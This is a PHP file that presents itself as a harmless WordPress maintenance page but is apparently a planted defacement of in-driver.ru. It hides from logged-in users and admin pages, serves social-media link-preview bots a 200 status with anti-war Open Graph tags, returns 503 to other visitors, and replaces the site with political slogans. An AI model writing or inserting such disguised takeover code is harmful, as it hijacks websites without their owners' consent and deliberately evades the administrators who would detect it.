<?php
/**
 * Custom maintenance page
 * Safe for WordPress include
 */

$uri = $_SERVER['REQUEST_URI'] ?? '';
if (preg_match('#^/(wp-login\.php|wp-admin)#', $uri)) {
    return;
}

$ua = strtolower($_SERVER['HTTP_USER_AGENT'] ?? '');

$is_bot = preg_match(
    '/facebookexternalhit|twitterbot|telegrambot|vkshare|linkedinbot|slackbot|whatsapp|discord/i',
    $ua
);

if (function_exists('is_user_logged_in') && is_user_logged_in()) {
    return;
}

if ($is_bot) {
    http_response_code(200);
} else {
    http_response_code(503);
    header('Retry-After: 3600');
}

header('Content-Type: text/html; charset=UTF-8');
?>
<!doctype html>
<html lang="en">
<head>
<meta charset="utf-8">
<title>STOP THE WAR</title>
<meta name="viewport" content="width=device-width, initial-scale=1">

<meta property="og:type" content="website">
<meta property="og:title" content="STOP THE WAR">
<meta property="og:description" content="NO TO WAR. FREEDOM FOR UKRAINE. END THE WAR NOW.">
<meta property="og:url" content="https://in-driver.ru/">
<meta property="og:image" content="https://live.staticflickr.com/65535/51990381853_04c8d914e7_4k.jpg">

<meta name="twitter:card" content="summary_large_image">

<style>
html,body{height:100%;margin:0}
body{
  background:
    linear-gradient(rgba(0,0,0,.45), rgba(0,0,0,.45)),
    url('https://live.staticflickr.com/65535/51990381853_04c8d914e7_4k.jpg')
    center/cover no-repeat fixed;
  color:#fff;
  font-family:system-ui,-apple-system,"Segoe UI",Arial,sans-serif;
  overflow:hidden;
}
.wrap{min-height:100vh;display:flex;align-items:center;justify-content:center;padding:16px;text-align:center}
.panel{max-width:960px;background:rgba(0,0,0,.55);padding:24px;border-radius:12px}
h1{color:#ff0000;font-size:clamp(44px,10vw,120px);margin:0 0 16px;text-shadow:0 0 20px rgba(255,0,0,.8)}
p{font-size:clamp(16px,4.5vw,32px);margin:8px 0}
hr{border:none;border-top:1px solid rgba(255,255,255,.6);margin:20px auto;width:70%}
</style>
</head>
<body>
<div class="wrap">
  <div class="panel">
    <h1>STOP THE WAR</h1>
    <p>NO TO WAR</p>
    <p>FREEDOM FOR UKRAINE</p>
    <hr>
    <p>PUTIN IS A WAR CRIMINAL</p>
    <p>END THE WAR NOW</p>
  </div>
</div>
</body>
</html>
<?php exit;
